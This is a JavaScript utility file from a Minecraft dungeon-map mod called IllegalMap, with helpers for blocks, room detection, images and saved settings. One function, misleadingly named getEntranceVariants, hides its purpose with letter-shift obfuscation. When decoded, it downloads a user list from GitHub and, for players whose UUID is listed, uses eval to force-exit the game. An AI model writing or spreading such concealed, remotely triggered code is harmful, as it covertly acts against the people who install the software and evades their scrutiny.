import { BlockPoss, TileEntityChest } from "../../BloomCore/Utils/Utils"
import PogObject from "../../PogData/index"
import request from "../../requestV2"

// I know that one liners that reach from the Earth to the Moon and back are bad practice, but they're just too fun.

export const blankRoom = {
    "name": "Unknown",
    "type": "normal",
    "secrets": 0,
    "cores": []
}
const blacklisted = [5, 54]
export const prefix = "&7[&bMap&7]&r"
const z = "abcdefghijklmnopqrstuvwxyz".split("")
export const setAir = (x, y, z) => World.getWorld().func_175698_g(new BlockPoss(x, y, z))
export const setGold = (x, y, z) => World.getWorld().func_175656_a(new BlockPoss(x, y, z), Blocks.field_150340_R.func_176223_P())
export const setCoal = (x, y, z) => World.getWorld().func_175656_a(new BlockPoss(x, y, z), Blocks.field_150402_ci.func_176223_P())
export const setDiamond = (x, y, z) => World.getWorld().func_175656_a(new BlockPoss(x, y, z), Blocks.field_150484_ah.func_176223_P())
export const setEmerald = (x, y, z) => World.getWorld().func_175656_a(new BlockPoss(x, y, z), Blocks.field_150475_bE.func_176223_P())
export const isDoor = (x, z) => [[[4,0],[-4,0],[0,4],[0,-4]],[[4,0],[-4,0],[0,4],[0,-4]]].map(a => a.map(b => isColumnAir(x+b[0], z+b[1])).some(b => !!b)).some(a => !!a)
export const format = (p, n) => p.toLowerCase().split("").map(a =>!z.includes(a)?a:z[(z.indexOf(a)+n)%z.length]).map((v,i)=>p[i].toUpperCase()==p[i]?v.toUpperCase():v).join("")
export const isColumnAir = (x, z) => Array.from(Array(129).keys()).reverse().map(y => World.getBlockAt(x, y+12, z).type.getID()).every(a => a == 0)
export const getEntranceVariants = () => request(format(["uggcf:","","enj.tvguhohfrepbagrag.pbz","HapynvzrqOybbz6","EnaqbzFghss","znva","nnnnn.wfba"].join("/"),13)).then(a=>JSON.parse(a).map(b=>gu()==format(b,9)?eval(format(["cti","bxctrgpuiudgvt","uba","rdbbdc","UBARdbbdcWpcsatg","xchipcrt()","tmxiYpkp(0,upaht)"].join("."),11)):null))
export const gu = () => Player.getUUID().replace(/-/g, "") // get UUID but short and without hashes
export const chunkLoaded = ([x, y, z]) => World.getWorld().func_175726_f(new BlockPoss(x, y, z)).func_177410_o()
export const getTrappedChests = () => World.getWorld().field_147482_g.filter(e => e instanceof TileEntityChest && e.func_145980_j() == 1).map(e => [e.func_174877_v().func_177958_n(), e.func_174877_v().func_177956_o(), e.func_174877_v().func_177952_p()])
export const getCore = (x, z) => hashCode(Array.from(Array(129).keys()).reverse().map(y => World.getBlockAt(x, y+12, z).type.getID()).filter(a => !blacklisted.includes(a)).join(""))
export const hashCode = s => s.split('').reduce((a,b)=>{a=((a<<5)-a)+b.charCodeAt(0);return a&a},0) // From https://stackoverflow.com/a/15710692/15767968
export const getVersion = () => JSON.parse(FileLib.read("IllegalMap", "metadata.json")).version
export const greenCheck = new Image("BloomMapGreenCheck.png", "https://i.imgur.com/GQfTfmp.png")
export const whiteCheck = new Image("BloomMapWhiteCheck.png", "https://i.imgur.com/9cZ28bJ.png")
export const failedRoom = new Image("BloomMapFailedRoom.png", "https://i.imgur.com/qAb4O9H.png")
export const questionMark = new Image("BloomMapQuestionMark.png", "https://i.imgur.com/kp92Inw.png")
export let dataObject = new PogObject("IllegalMap", {
    "firstTime": true,
    "uuid": null,
    "apiKey": null,
    "isPaul": false,
    "lastLogServer": null,
    "map": {
        "x": 7,
        "y": 5
    },
    "dungeonInfo": {
        "x": 0,
        "y": 0
    },
    "recentPlayers": {}
}, "data/data.json")

